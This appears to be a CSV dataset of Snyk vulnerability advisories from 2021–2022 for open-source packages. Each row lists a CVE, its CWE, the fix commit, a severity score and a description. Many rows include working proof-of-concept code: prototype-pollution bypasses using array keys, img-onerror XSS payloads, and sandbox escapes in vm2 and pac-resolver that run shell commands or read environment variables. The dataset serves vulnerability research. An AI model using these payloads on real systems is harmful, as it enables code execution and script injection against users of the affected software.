CVE-2022-25856,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMARGOPROJARGOEVENTSSENSORSARTIFACTS-2864522,12/06/2022,09/06/2022,https://github.com/argoproj/argo-events/commit/d0f66dbce78bc31923ca057b20fc722aa24ca961,Directory Traversal,https://api.github.com/repos/argoproj/argo-events/commits/d0f66dbce78bc31923ca057b20fc722aa24ca961,Derek Wang,whynowy@gmail.com,argo-events,d0f66dbce78bc31923ca057b20fc722aa24ca961,"fix: git artifactory arbitrary file read issue (#1965)

Signed-off-by: Derek Wang <whynowy@gmail.com>",Go,7.5,high,Affected versions of this package are vulnerable to Directory Traversal in the (g *GitArtifactReader).Read() API in git.go. This could allow arbitrary file reads if the GitArtifactReader is provided a pathname containing a symbolic link or an implicit directory name such as ...,2022
CVE-2022-25851,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-JPEGJS-2859218,07/06/2022,06/06/2022,https://github.com/jpeg-js/jpeg-js/commit/9ccd35fb5f55a6c4f1902ac5b0f270f675750c27,Denial of Service (DoS),https://api.github.com/repos/jpeg-js/jpeg-js/commits/9ccd35fb5f55a6c4f1902ac5b0f270f675750c27,Sohom Datta,dattasohom1@gmail.com,jpeg-js,9ccd35fb5f55a6c4f1902ac5b0f270f675750c27,fix: validate sampling factors (#106),JavaScript,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) where a particular piece of input will cause to enter an infinite loop and never return.,2022
CVE-2022-24278,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2859830,07/06/2022,07/06/2022,https://github.com/neocotic/convert-svg/commit/2bbc498c5029238637206661dbac9e44d37d17c5,Directory Traversal,https://api.github.com/repos/neocotic/convert-svg/commits/2bbc498c5029238637206661dbac9e44d37d17c5,Alasdair,mercer.alasdair@gmail.com,convert-svg,2bbc498c5029238637206661dbac9e44d37d17c5,"Convert only first SVG element from input

If the input to be converted contains multiple SVG elements, only the first SVG element should be converted. Currently, and undesirably, all SVG elements were being inserted into the page within Puppeteer, resulting in them all being stacked prior to the screenshot being taken.

Another symptom of this was that all recent safety measures implemented for remote code injection vulnerabilities can be easily circumvented by inserting a simple empty SVG element at the start of the input as it was the only one being sanitized.",JavaScript,7.5,high,"convert-svg-core is a package that supports converting SVG into another format using headless Chromium.
Affected versions of this package are vulnerable to Directory Traversal due to improper sanitization of SVG tags. Exploiting this vulnerability is possible by using a specially crafted SVG file.",2022
CVE-2022-24429,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2859212,06/06/2022,06/06/2022,https://github.com/neocotic/convert-svg/commit/a43dffaab0f1e419d5be84e2e7356b86ffac3cf1,Arbitrary Code Injection,https://api.github.com/repos/neocotic/convert-svg/commits/a43dffaab0f1e419d5be84e2e7356b86ffac3cf1,Alasdair,alasdair.mercer@unity3d.com,convert-svg,a43dffaab0f1e419d5be84e2e7356b86ffac3cf1,"Remove all disallowed SVG element attributes

In a further attempt to reduce remote code injection attack vectors, all attributes except for a set of allowed standard attributes are removed from the SVG element before being converted. Deprecated attributes are included by default, however, these can also be removed by disabling the new `allowDeprecatedAttributes` option.",Config files,7.5,high,"convert-svg-core is a package that supports converting SVG into another format using headless Chromium.
Affected versions of this package are vulnerable to Arbitrary Code Injection when using a specially crafted SVG file. An attacker can read arbitrary files from the file system and then show the file content as a converted PNG file.",2022
CVE-2022-25845,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMALIBABA-2859222,07/06/2022,06/06/2022,https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d,Deserialization of Untrusted Data,https://api.github.com/repos/alibaba/fastjson/commits/35db4adad70c32089542f23c272def1ad920a60d,shaojin.wensj,shaojin.wensj@alibaba-inc.com,fastjson,35db4adad70c32089542f23c272def1ad920a60d,bug fix for autoType,Java,8.1,high,"com.alibaba:fastjson is a fast JSON parser/generator for Java.
Affected versions of this package are vulnerable to Deserialization of Untrusted Data by bypassing the default autoType shutdown restrictions, which is possible under certain conditions. Exploiting this vulnerability allows attacking remote servers.",2022
CVE-2022-24065,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-COOKIECUTTER-2414281,02/06/2022,02/03/2022,https://github.com/cookiecutter/cookiecutter/commit/fdffddb31fd2b46344dfa317531ff155e7999f77,Command Injection,https://api.github.com/repos/cookiecutter/cookiecutter/commits/fdffddb31fd2b46344dfa317531ff155e7999f77,Jens W. Klein,jk@kleinundpartner.at,cookiecutter,fdffddb31fd2b46344dfa317531ff155e7999f77,"Merge pull request #1689 from cookiecutter/sanitize-mercurial-checkout

Sanitize Mercurial branch information before checkout.",Markdown,8.1,high,"cookiecutter is a command-line utility that creates projects from cookiecutters.
Affected versions of this package are vulnerable to Command Injection via hg argument injection. When calling the cookiecutter function from Python code with the checkout parameter, it is passed to the hg checkout command in a way that additional flags can be set. The additional flags can be used to perform a command injection.",2022
CVE-2022-25647,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMGOOGLECODEGSON-1730327,02/11/2021,11/10/2021,https://github.com/google/gson/commit/a0090c8382c12531d377002ad9f7717c0197dc5d,Deserialization of Untrusted Data,https://api.github.com/repos/google/gson/commits/a0090c8382c12531d377002ad9f7717c0197dc5d,limpbizkit@gmail.com,limpbizkit@gmail.com@2534bb62-2c4b-0410-85e8-b5006b95c4ae,gson,a0090c8382c12531d377002ad9f7717c0197dc5d,"Regretfully enable serialization for StringMap and LazilyParsedNumber.

One of our favorite users (my employer!) is stuck in a sad situation where they need to serialize objects returned from Gson; this is a workable escape hatch.",Java,6.5,medium,"Affected versions of this package are vulnerable to Deserialization of Untrusted Data via the writeReplace() method in internal classes, which may allow a denial of service attack if combined with another exploit.",2021
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SHOPXOSHOPXO-1537648,31/10/2021,31/10/2021,https://github.com/gongfuxiang/shopxo/commit/9259db686b0f80752c78fe0782797f3c28947fe9,Cross-site Scripting (XSS),https://api.github.com/repos/gongfuxiang/shopxo/commits/9259db686b0f80752c78fe0782797f3c28947fe9,Devil,fuxiang.gong@qq.com,shopxo,9259db686b0f80752c78fe0782797f3c28947fe9,下单规格转义处理,PHP,5.4,medium,"shopxo/shopxo is an e-commerce system.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) by using the index.php?s=order&amp;ids=""&gt;alert(1); payload.",2021
CVE-2021-23463,CWE-611,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMH2DATABASE-1769238,31/10/2021,30/10/2021,https://github.com/h2database/h2database/commit/d83285fd2e48fb075780ee95badee6f5a15ea7f8#diff-008c2e4462609982199cd83e7cf6f1d6b41296b516783f6752c44b9f15dc7bc3,XML External Entity (XXE) Injection,https://api.github.com/repos/h2database/h2database/commits/d83285fd2e48fb075780ee95badee6f5a15ea7f8#diff-008c2e4462609982199cd83e7cf6f1d6b41296b516783f6752c44b9f15dc7bc3,Andrei Tokar,andrei.tokar@gmail.com,h2database,d83285fd2e48fb075780ee95badee6f5a15ea7f8,fix for #3195 CQLXML XXE vulnerability,Java,8.1,high,"com.h2database:h2 is a database engine
Affected versions of this package are vulnerable to XML External Entity (XXE) Injection via the org.h2.jdbc.JdbcSQLXML class object, when it receives parsed string data from org.h2.jdbc.JdbcResultSet.getSQLXML() method. If it executes the getSource() method when the parameter is DOMSource.class it will trigger the vulnerability.",2021
CVE-2021-23451,CWE-330,Snyk,https://security.snyk.io/vuln/SNYK-JS-OTPGENERATOR-1655480,18/10/2021,19/09/2021,https://github.com/Maheshkumar-Kakade/otp-generator/commit/b27de1ce439ae7f533cec26677e9698671275b70,Insecure Randomness,https://api.github.com/repos/Maheshkumar-Kakade/otp-generator/commits/b27de1ce439ae7f533cec26677e9698671275b70,Maheshkumar Kakade,maheshkumarkakade@gmail.com,otp-generator,b27de1ce439ae7f533cec26677e9698671275b70,Changed Math.Random with crypto.randomInt,Markdown,6.5,medium,"otp-generator is an One time password generator
Affected versions of this package are vulnerable to Insecure Randomness due to insecure generation of random one-time passwords, which may allow a brute-force attack.",2021
CVE-2021-23449,CWE-265,Snyk,https://security.snyk.io/vuln/SNYK-JS-VM2-1585918,15/10/2021,17/09/2021,https://github.com/patriksimek/vm2/commit/b4f6e2bd2c4a1ef52fc4483d8e35f28bc4481886,Sandbox Bypass,https://api.github.com/repos/patriksimek/vm2/commits/b4f6e2bd2c4a1ef52fc4483d8e35f28bc4481886,XmiliaH,xmilia.hermit@gmail.com,vm2,b4f6e2bd2c4a1ef52fc4483d8e35f28bc4481886,Security Fixes,JavaScript,9.8,critical,"vm2 is a sandbox that can run untrusted code with whitelisted Node's built-in modules.
Affected versions of this package are vulnerable to Sandbox Bypass via a Prototype Pollution attack vector, which can lead to execution of arbitrary code on the host machine.
PoC
const {VM} = require(""vm2"");
let vmInstance = new VM();

let code =         res = eval(&#39;import(\\&#39;./foo.js\\&#39;);&#39;)         res.__proto__.__proto__.polluted = res.__proto__.__proto__.toString.constructor(&quot;return this&quot;)().process.mainModule.require(&quot;child_process&quot;).execSync(&quot;touch HACKED&quot;).toString();;
vmInstance.run(code);
console.log(polluted);",2021
,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SCARTCORE-1564826,07/10/2021,15/08/2021,https://github.com/s-cart/core/commit/fe8cc6ec8a3390929b567f538649b500ee42b059,SQL Injection,https://api.github.com/repos/s-cart/core/commits/fe8cc6ec8a3390929b567f538649b500ee42b059,Lanh Le,lanhktc@gmail.com,core,fe8cc6ec8a3390929b567f538649b500ee42b059,Fix error SQL Injection admin,PHP,8.6,high,"s-cart/core is a free Laravel e-commerce for business.
Affected versions of this package are vulnerable to SQL Injection via the keyword parameter in /sc_admin/currency.",2021
CVE-2021-23445,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-DATATABLESNET-1540544,27/09/2021,12/08/2021,https://github.com/DataTables/Dist-DataTables/commit/59a8d3f8a3c1138ab08704e783bc52bfe88d7c9b,Cross-site Scripting (XSS),https://api.github.com/repos/DataTables/Dist-DataTables/commits/59a8d3f8a3c1138ab08704e783bc52bfe88d7c9b,Allan Jardine,allan.jardine@sprymedia.co.uk,Dist-DataTables,59a8d3f8a3c1138ab08704e783bc52bfe88d7c9b,"e835ddc5b800c47f7e9e32a91cc522f8ca7ced5c Fix: If an array was passed to the HTML escape entities function it would not have its contents escaped

Many thanks to Alessio Della Libera of Snyk for finding and reporting this.

Sync to source repo @e835ddc5b800c47f7e9e32a91cc522f8ca7ced5c",Config files,3.1,low,"datatables.net is a DataTables for jQuery
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). If an array is passed to the HTML escape entities function it would not have its contents escaped.",2021
CVE-2021-38153,CWE-208,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEKAFKA-1540736,21/09/2021,13/08/2021,https://github.com/apache/kafka/commit/00c086e9087c3163cb0502bf0067bae4d401d66e,Timing Attack,https://api.github.com/repos/apache/kafka/commits/00c086e9087c3163cb0502bf0067bae4d401d66e,Randall Hauch,rhauch@gmail.com,kafka,00c086e9087c3163cb0502bf0067bae4d401d66e,"MINOR: Use time constant algorithms when comparing passwords or keys (#10978)

Author: Randall Hauch <rhauch@gmail.com>
Reviewers: Manikumar Reddy <manikumar@confluent.io>, Rajini Sivaram <rajinisivaram@gmail.com>, Mickael Maison <mickael.maison@gmail.com>, Ismael Juma <ijuma@apache.org>",Java,6.8,medium,"Affected versions of this package are vulnerable to Timing Attack. Some components in Apache Kafka use Arrays.equals to validate a password or key, which is vulnerable to brute force attacks by malicious users.",2021
CVE-2021-38153,CWE-208,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEKAFKA-1540737,21/09/2021,13/08/2021,https://github.com/apache/kafka/commit/00c086e9087c3163cb0502bf0067bae4d401d66e,Timing Attack,https://api.github.com/repos/apache/kafka/commits/00c086e9087c3163cb0502bf0067bae4d401d66e,Randall Hauch,rhauch@gmail.com,kafka,00c086e9087c3163cb0502bf0067bae4d401d66e,"MINOR: Use time constant algorithms when comparing passwords or keys (#10978)

Author: Randall Hauch <rhauch@gmail.com>
Reviewers: Manikumar Reddy <manikumar@confluent.io>, Rajini Sivaram <rajinisivaram@gmail.com>, Mickael Maison <mickael.maison@gmail.com>, Ismael Juma <ijuma@apache.org>",Java,6.8,medium,"org.apache.kafka:kafka-clients is a streaming platform that can publish and subscribe to streams of records, store streams of records in a fault-tolerant durable way, and process streams of records as they occur.
Affected versions of this package are vulnerable to Timing Attack. Some components in Apache Kafka use Arrays.equals to validate a password or key, which is vulnerable to brute force attacks by malicious users.",2021
CVE-2021-23444,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578,21/09/2021,01/09/2021,https://github.com/clientIO/joint/commit/e5bf89efef6d5ea572d66870ffd86560de7830a8,Prototype Pollution,https://api.github.com/repos/clientIO/joint/commits/e5bf89efef6d5ea572d66870ffd86560de7830a8,Roman Bruckner,bruckner.roman@gmail.com,joint,e5bf89efef6d5ea572d66870ffd86560de7830a8,util.setByPath() - prevent prototype pollution (#1514),Unknown,5.6,medium,"jointjs is a JavaScript diagramming library. It can be used to create either static diagrams or, and more importantly, fully interactive diagramming tools and application builders.
Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2020-28480 when the user-provided keys used in the path parameter are arrays in the setByPath function.
PoC
const jointjs = require(""jointjs"");

// jointjs.util.setByPath({}, 'proto/polluted', 'yes');
// jointjs.util.setByPath({}, ['proto', 'polluted'], 'yes');
// console.log(polluted); // ReferenceError: polluted is not defined
jointjs.util.setByPath({}, [['proto'], 'polluted'], 'yes');
console.log(polluted); // yes",2021
CVE-2021-23433,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-ALGOLIASEARCHHELPER-1570421,19/11/2021,27/08/2021,https://github.com/algolia/algoliasearch-helper-js/commit/4ff542b70b92a6b81cce8b9255700b0bc0817edd,Prototype Pollution,https://api.github.com/repos/algolia/algoliasearch-helper-js/commits/4ff542b70b92a6b81cce8b9255700b0bc0817edd,Haroen Viaene,hello@haroen.me,algoliasearch-helper-js,4ff542b70b92a6b81cce8b9255700b0bc0817edd,"fix(SearchParameters): ignore invalid parameters (#880)

* fix(SearchParameters): ignore invalid parameters

These parameters could be used maliciously, so are explicilty not allowed in merge

* clearer test",JavaScript,5.9,medium,"algoliasearch-helper is a Helper for implementing advanced search features with algolia
Affected versions of this package are vulnerable to Prototype Pollution due to use of the merge function in src/SearchParameters/index.js#SearchParameters._parseNumbers without any protection against prototype properties.
Note that this vulnerability is only exploitable if the implementation allows users to define arbitrary search patterns.
PoC
// Run npm i algoliasearch-helper, then run the below code
const algohelp = require('algoliasearch-helper')
var payload = JSON.parse('{""__proto__"": {""polluted"": ""vulnerable to PP""}}');
var test = {};
console.log(""Before: "" + test.polluted); // Before: undefined
algohelp.SearchParameters._parseNumbers(payload); // {}
console.log(""After: "" + test.polluted); // After: vulnerable to PP",2021
CVE-2021-23784,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-TEMPURA-1569633,03/11/2021,25/08/2021,https://github.com/lukeed/tempura/commit/58a5c3671e2f36b26810e77ead9e0dd471902f9b,Cross-site Scripting (XSS),https://api.github.com/repos/lukeed/tempura/commits/58a5c3671e2f36b26810e77ead9e0dd471902f9b,Luke Edwards,luke.edwards05@gmail.com,tempura,58a5c3671e2f36b26810e77ead9e0dd471902f9b,"break: ensure `esc` always returns a string;

- prevents a XSS attack within an array",Markdown,5.4,medium,"tempura is an A light, crispy, and delicious template engine.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). If the input to the esc function is of type object (i.e an array) it is returned without being escaped/sanitized, leading to a potential Cross-Site Scripting vulnerability.
PoC
const tempura = require(""tempura"");

let template =     {{#expect name}}     &lt;p&gt; Hello, {{name}} &lt;/p&gt;
let render = tempura.compile(template)
let r1 = render({name: ""<img src=x onerror='alert(1)' />""})
console.log(r1) // <p> Hello, &ltimg src=x onerror='alert(1)' /> </p>
let r2 = render({name: [""<img src=x onerror='alert(1)' />""]})
console.log(r2) // <p> Hello, <img src=x onerror='alert(1)' /> </p>",2021
CVE-2021-23807,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288,03/11/2021,31/08/2021,https://github.com/janl/node-jsonpointer/commit/a0345f3550cd9c4d89f33b126390202b89510ad4,Prototype Pollution,https://api.github.com/repos/janl/node-jsonpointer/commits/a0345f3550cd9c4d89f33b126390202b89510ad4,Jan Lehnardt,jan@apache.org,node-jsonpointer,a0345f3550cd9c4d89f33b126390202b89510ad4,"Merge pull request #51 from dellalibera/fix-prototype-pollution

fix-prototype-pollution",JavaScript,5.6,medium,"jsonpointer is a Simple JSON Addressing.
Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of a previous Prototype Pollution fix when the pointer components are arrays.
PoC
const jsonpointer = require('jsonpointer');

// jsonpointer.set({}, ['proto', 'proto', 'polluted'], 'yes');
// console.log(polluted); // ReferenceError: polluted is not defined
jsonpointer.set({}, [['proto'], ['proto'], 'polluted'], 'yes');
console.log(polluted); // yes",2021
CVE-2021-23624,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DOTTY-1577292,03/11/2021,01/09/2021,https://github.com/deoxxa/dotty/commit/88f61860dcc274a07a263c32cbe9d44c24ef02d7,Prototype Pollution,https://api.github.com/repos/deoxxa/dotty/commits/88f61860dcc274a07a263c32cbe9d44c24ef02d7,Michael Stramel,stramel@users.noreply.github.com,dotty,88f61860dcc274a07a263c32cbe9d44c24ef02d7,"Address different method of prototype pollution (#32)

* remove ds_store file

* Fix pototype pollution

* Bump deps

* Update docs

* Update workflow to test against latest node versions

* Ensure put returns true

* Remove node v6,8,10 from testing",Unknown,5.6,medium,"dotty is a package that can access properties of nested objects using dot-path notation.
Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2021-25912 when the user-provided keys used in the path parameter are arrays.
PoC
const dotty = require('dotty');

// dotty.put({}, ['proto','polluted'], 'yes');
// console.log(polluted); // ReferenceError: polluted is not defined
dotty.put({}, [['proto'],'polluted'], 'yes');
console.log(polluted); // yes",2021
CVE-2021-23509,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSONPTR-1577291,03/11/2021,01/09/2021,https://github.com/flitbit/json-ptr/commit/5dc458fbad1c382a2e3ca6d62e66ede3d92849ca,Prototype Pollution,https://api.github.com/repos/flitbit/json-ptr/commits/5dc458fbad1c382a2e3ca6d62e66ede3d92849ca,Phillip Clark,phillip@flitbit.com,json-ptr,5dc458fbad1c382a2e3ca6d62e66ede3d92849ca,Fixed vulnerability reported by Snyk,TypeScript,5.6,medium,"json-ptr is a complete implementation of JSON Pointer (RFC 6901) for nodejs and modern browsers.
Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2020-7766 when the user-provided keys used in the pointer parameter are arrays. 
PoC
const { JsonPointer } = require(""json-ptr"");

// JsonPointer.set({}, ['proto', 'polluted'], 'yes', true); 
// console.log(polluted); // Error: Attempted prototype pollution disallowed.
JsonPointer.set({}, [['proto'], 'polluted'], 'yes', true); 
console.log(polluted); // yes",2021
CVE-2021-23820,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577287,03/11/2021,31/08/2021,https://github.com/manuelstofer/json-pointer/commit/47dae1d369a25bd9bdcdbc963b8699b89a882c81,Prototype Pollution,https://api.github.com/repos/manuelstofer/json-pointer/commits/47dae1d369a25bd9bdcdbc963b8699b89a882c81,Heitham Omar,hhomar@gmail.com,json-pointer,47dae1d369a25bd9bdcdbc963b8699b89a882c81,Fix prototype pollution when pointer is not a string or number,JavaScript,5.6,medium,"json-pointer is a set of utilities for JSON pointers described by RFC 6901
Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2020-7709 when the pointer components are arrays.
PoC
const pointer = require('json-pointer');

// pointer.set({}, ['proto', 'polluted'], 'yes')
// console.log(polluted) // ReferenceError: polluted is not defined
pointer.set({}, [['proto'], 'polluted'], 'yes')
console.log(polluted)""",2021
CVE-2021-23472,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-BOOTSTRAPTABLE-1657597,03/11/2021,22/09/2021,https://github.com/wenzhixin/bootstrap-table/commit/8a46a228b3ffb0b5f4123d46830bd216b9c51bf1,Cross-site Scripting (XSS),https://api.github.com/repos/wenzhixin/bootstrap-table/commits/8a46a228b3ffb0b5f4123d46830bd216b9c51bf1,zhixin,wenzhixin2010@gmail.com,bootstrap-table,8a46a228b3ffb0b5f4123d46830bd216b9c51bf1,Fixed the CVE security problem,JavaScript,3.1,low,"bootstrap-table is an extended table to integration with some of the most widely used CSS frameworks. (Supports Bootstrap, Semantic UI, Bulma, Material Design, Foundation, Vue.js).
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). A type confusion vulnerability can lead to a bypass of input sanitization when the input provided to the escapeHTML function is an array (instead of a string) even if the escape attribute is set.
PoC
<!DOCTYPE html>
<html lang=""en"">
    <head>
    <meta charset=""UTF-8"">
    <title>BootStrap-Table</title>
    
&lt;link href=&quot;./node_modules/bootstrap-table/dist/bootstrap-table.min.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;./node_modules/jquery/dist/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;./node_modules/bootstrap-table/dist/bootstrap-table.js&quot;&gt;&lt;/script&gt;


&lt;/head&gt;
&lt;body&gt;
    &lt;table 
        id=&quot;table&quot;
        data-toggle=&quot;table&quot;
        data-escape=&quot;true&quot;
        data-url=&quot;json/data1.json&quot;
    &gt;
        &lt;thead&gt;
          &lt;tr&gt;
            &lt;th data-field=&quot;name&quot;&gt;&lt;/th&gt;
          &lt;/tr&gt;
        &lt;/thead&gt;
    &lt;/table&gt;
&lt;/body&gt;

</html>

Content of json/data1.json:
[
    {
        ""name"": ""Hello World! <img src='' onerror='alert(1)' />""
    },
    {
        ""name"": [""Hello World! <img src='' onerror='alert(2)' />""]
    }
]",2021
CVE-2021-23434,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453,27/08/2021,25/08/2021,https://github.com/mariocasciaro/object-path/commit/7bdf4abefd102d16c163d633e8994ef154cab9eb,Prototype Pollution,https://api.github.com/repos/mariocasciaro/object-path/commits/7bdf4abefd102d16c163d633e8994ef154cab9eb,Mario Casciaro,mariocasciaro@gmail.com,object-path,7bdf4abefd102d16c163d633e8994ef154cab9eb,Fix prototype pollution when path components are not strings,JavaScript,5.6,medium,"object-path is a package to access deep properties using a path
Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2020-15256 when the path components used in the path parameter are arrays. In particular, the condition currentPath === '__proto__' returns false if currentPath is ['__proto__']. This is because the === operator returns always false when the type of the operands is different.
PoC
const objectPath = require('object-path');

objectPath.withInheritedProps.set({}, [['proto'], 'polluted'], 'yes');
console.log(polluted); // yes",2021
CVE-2021-23431,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-JS-JOPLIN-1325537,22/08/2021,25/07/2021,https://github.com/laurent22/joplin/commit/19b45de2981c09f6f387498ef96d32b4811eba5e,Cross-site Request Forgery (CSRF),https://api.github.com/repos/laurent22/joplin/commits/19b45de2981c09f6f387498ef96d32b4811eba5e,Laurent Cozic,laurent@cozic.net,joplin,19b45de2981c09f6f387498ef96d32b4811eba5e,Server: Added form tokens to prevent CSRF attacks,TypeScript,5.4,medium,"joplin is a note taking and to-do application.
Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) due to missing CSRF checks in various forms.",2021
CVE-2021-23406,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-PACRESOLVER-1564857,22/08/2021,30/05/2021,https://github.com/TooTallNate/node-degenerator/commit/ccc3445354135398b6eb1a04c7d27c13b833f2d5,Remote Code Execution (RCE),https://api.github.com/repos/TooTallNate/node-degenerator/commits/ccc3445354135398b6eb1a04c7d27c13b833f2d5,Nathan Rajlich,n@n8.io,node-degenerator,ccc3445354135398b6eb1a04c7d27c13b833f2d5,Fix return `undefined`,TypeScript,8.1,high,"Affected versions of this package are vulnerable to Remote Code Execution (RCE). This can occur when used with untrusted input, due to unsafe PAC file handling.
In order to exploit this vulnerability in practice, this either requires an attacker on your local network, a specific vulnerable configuration, or some second vulnerability that allows an attacker to set your config values.
NOTE: The fix for this vulnerability is applied in the node-degenerator library, a dependency is written by the same maintainer. 
PoC
const pac = require('pac-resolver');

// Should keep running forever (if not vulnerable):
setInterval(() => {
    console.log(""Still running"");
}, 1000);
// Parsing a malicious PAC file unexpectedly executes unsandboxed code:
pac(`
    // Real PAC config:
    function FindProxyForURL(url, host) {
        return ""DIRECT"";
    }
// But also run arbitrary code:
var f = this.constructor.constructor(\`
    // Running outside the sandbox:
    console.log(&#39;Read env vars:&#39;, process.env);
    console.log(&#39;!!! PAC file is running arbitrary code !!!&#39;);
    console.log(&#39;Can read &amp; could exfiltrate env vars ^&#39;);
    console.log(&#39;Can kill parsing process, like so:&#39;);
    process.exit(100); // Kill the vulnerable process
    // etc etc
\`);

f();",2021
CVE-2021-23443,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-EDGEJS-1579556,21/09/2021,01/09/2021,https://github.com/edge-js/edge/commit/fa2c7fde86327aeae232752e89a6e37e2e469e21,Cross-site Scripting (XSS),https://api.github.com/repos/edge-js/edge/commits/fa2c7fde86327aeae232752e89a6e37e2e469e21,Harminder Virk,virk.officials@gmail.com,edge,fa2c7fde86327aeae232752e89a6e37e2e469e21,fix: Cross-Site Scripting vulnerability reported by Snyk security team,TypeScript,5.4,medium,"edge.js is a Node.js templating engine with fresh air.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). A type confusion vulnerability can be used to bypass input sanitization when the input to be rendered is an array (instead of a string or a SafeValue),  even if {{ }} are used.
PoC
- create the following file (welcome.edge) under the views folder:
<p> {{ greeting }} </p>


run the following code:
const { join } = require('path')

const edge = require('edge.js').default
edge.mount(join(__dirname, 'views'))
edge.render('welcome', {
  greeting: ""<img src=x onerror='alert(1)' />""
}).then(html => console.log(html)) // <p> &lt;img src=x onerror=&#x27;alert(1)&#x27; /&gt; </p>
edge.render('welcome', {
    greeting: [""<img src=x onerror='alert(2)' />""]
  }).then(html => console.log(html)) // <p> <img src=x onerror='alert(2)' /> </p>",2021
CVE-2021-23442,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-COOKIEXDEEP-1582793,16/09/2021,06/09/2021,https://github.com/tony-tsx/cookiex-deep/commit/b5bea2b7f34a5fa9abb4446cbd038ecdbcd09c88,Prototype Pollution,https://api.github.com/repos/tony-tsx/cookiex-deep/commits/b5bea2b7f34a5fa9abb4446cbd038ecdbcd09c88,Tony,tony.js@zoho.eu,cookiex-deep,b5bea2b7f34a5fa9abb4446cbd038ecdbcd09c88,fix: prototype pollution fix #1,TypeScript,8.6,high,"@cookiex/deep is a Tool to assign properties recursively and create recursion features in an easy way.
Affected versions of this package are vulnerable to Prototype Pollution. The global proto object can be polluted using the __proto__ object.
PoC
var deep = require(""@cookiex/deep"")
const target = {}
console.log(""Before:""+{}.polluted)
deep.default( target, JSON.parse('{""__proto__"":{""polluted"":""Prototype is polluted !!!""}}'))
console.log(""After:""+{}.polluted)",2021
CVE-2021-23440,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-SETVALUE-1540541,12/09/2021,12/08/2021,https://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452,Prototype Pollution,https://api.github.com/repos/jonschlinkert/set-value/commits/7cf8073bb06bf0c15e08475f9f952823b4576452,Jon Schlinkert,github@sellside.com,set-value,7cf8073bb06bf0c15e08475f9f952823b4576452,"4.0.1

Fixes https://github.com/jonschlinkert/set-value/pull/33 thanks to @ready-research.",Config files,7.3,high,"set-value is a package that creates nested values and any intermediaries using dot notation ('a.b.c') paths.
Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2019-10747 when the user-provided keys used in the path parameter are arrays.
PoC
const set = require(""set-value"")

// set({}, ['proto','polluted'], 'yes');
// console.log(polluted); // Error: Cannot set unsafe key: ""proto""
set({}, [['proto'],'polluted'], 'yes');
console.log(polluted);",2021
CVE-2021-23438,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MPATH-1577289,01/09/2021,31/08/2021,https://github.com/aheckmann/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc,Prototype Pollution,https://api.github.com/repos/aheckmann/mpath/commits/89402d2880d4ea3518480a8c9847c541f2d824fc,Valeri Karpov,val@karpov.io,mpath,89402d2880d4ea3518480a8c9847c541f2d824fc,"fix: throw error if `parts` contains an element that isn't a string or number

Fix #13",JavaScript,5.6,medium,"mpath is a package that gets/sets javascript object values using MongoDB-like path notation.
Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2018-16490. In particular, the condition ignoreProperties.indexOf(parts[i]) !== -1 returns -1 if parts[i] is ['__proto__']. This is because the method that has been called if the input is an array is Array.prototype.indexOf() and not String.prototype.indexOf(). They behave differently depending on the type of the input.
PoC
const mpath = require('mpath');
// mpath.set(['__proto__', 'polluted'], 'yes', {});
// console.log(polluted); // ReferenceError: polluted is not defined

mpath.set([['proto'], 'polluted'], 'yes', {});
console.log(polluted); // yes",2021
